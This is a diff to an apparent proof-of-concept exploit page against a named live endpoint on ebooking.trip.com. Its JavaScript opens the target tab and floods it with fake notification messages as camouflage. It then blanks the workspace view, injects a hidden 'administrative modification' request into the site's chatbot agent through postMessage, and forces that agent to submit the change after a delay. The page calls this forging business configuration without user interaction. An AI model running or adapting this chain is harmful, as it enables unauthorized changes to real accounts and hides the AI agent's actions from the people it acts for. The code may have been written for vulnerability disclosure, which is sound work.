@@ -48,7 +48,7 @@
     <h2>Exploit Window: Multi-Stage PostMessage Injection Chain</h2>
     <p><strong>Target:</strong> <code>https://ebooking.trip.com/home/oversea?microJump=true</code></p>
     <p>This page demonstrates zero-interaction business configuration forgery via cross-origin parameter orchestration, workspace masking, and visual camouflage triggers.</p>
-
+    
     <button onclick="startExploitChain()">Launch Exploit Chain</button>
 
     <div class="log-box" id="statusLog">
@@ -65,24 +65,46 @@ function logger(msg) {
 
 function startExploitChain() {
     logger("[*] Stage 0: Spawning target window handle...");
-
+    
     // 1. Establish cross-tab binding handle to the target endpoint
     const targetWindow = window.open("https://ebooking.trip.com/home/oversea?microJump=true", "_blank");
-
+    
     if (!targetWindow) {
         logger("[!] Error: Pop-up blocked! Please allow pop-ups for this domain to execute the chain.");
         return;
     }
 
     logger("[+] Target browser tab initialized successfully.");
-    logger("[*] Waiting 5s for target page to load and register listeners...");
+    logger("[*] Stage 1A: Initiating persistent 5-second notification flooding loop...");
 
-    // 2. Buffer so the target page has time to mount its message listeners
-    //    before anything is sent, otherwise early messages are dropped silently
+    // 2. Set up interval loop to continuously spike notification badges for 5 seconds
+    const notificationFloodInterval = setInterval(() => {
+        targetWindow.postMessage({
+            messageType: "updateImUnreadCount",
+            imUnreadCount: 99,
+            messageUnreadCount: 99,
+            supportUnreadCount: 99,
+            bookingConsultTodoCount: 99
+        }, "https://ebooking.trip.com"); 
+    }, 100); // Rapid fire every 100ms
+
+    // 3. NEW STEP: Force full-screen workspace override to clear out layout views completely
     setTimeout(() => {
-        logger("[+] Buffer elapsed. Stage 1: Injecting administrative modification intent...");
+        logger("[*] Stage 1B: Blasting workspace context override to force full-screen layout blanking...");
+        targetWindow.postMessage({
+            messageType: "selectGroupItem",
+            groupKey: "BLIND_EXPLOIT_MASK_HASH",
+            groupId: "MASK_SYSTEM",
+            orderId: "MASK_SYSTEM"
+        }, "https://ebooking.trip.com");
+    }, 1000); // Trigger 1 second after loading to allow page framework components to settle
 
-        // 3. Inject the payload into the chatbot handler
+    // 4. Clear the flood filter after exactly 5 seconds, then seed the action intent
+    setTimeout(() => {
+        clearInterval(notificationFloodInterval);
+        logger("[+] Visual masking stage completed (5-second window expired).");
+        logger("[*] Stage 2: Injecting background administrative modification intent...");
+
         targetWindow.postMessage({
             messageType: "openChatbot",
             data: {
@@ -91,21 +113,12 @@ function startExploitChain() {
             }
         }, "https://ebooking.trip.com");
 
-        // 4. Immediately follow with the workspace override to force full-screen blanking over Genie
-        logger("[*] Stage 2: Blasting workspace context override to force full-screen layout blanking...");
-        targetWindow.postMessage({
-            messageType: "selectGroupItem",
-            groupKey: "BLIND_EXPLOIT_MASK_HASH",
-            groupId: "MASK_SYSTEM",
-            orderId: "MASK_SYSTEM"
-        }, "https://ebooking.trip.com");
-
         logger("[+] Action request pre-staged. Initiating 7-second background processing timer...");
 
-        // 5. Wait 7 seconds for the backend agent to generate the form fields, then force submission
+        // 5. Wait exactly 7 seconds for the backend agent to generate the form fields, then force submission
         setTimeout(() => {
             logger("[*] Stage 3: Timing delay reached. Blasting automated 'Submit' bypass payload...");
-
+            
             targetWindow.postMessage({
                 messageType: "openChatbot",
                 data: {
@@ -117,7 +130,7 @@ function startExploitChain() {
             logger("[CRITICAL] Exploit pipeline fully executed. Transaction committed cleanly.");
         }, 7000); // 7-second post-prompt buffer
 
-    }, 5000); // 5-second page-load buffer
+    }, 5000); // 5-second notification mask window
 }
 </script>
 
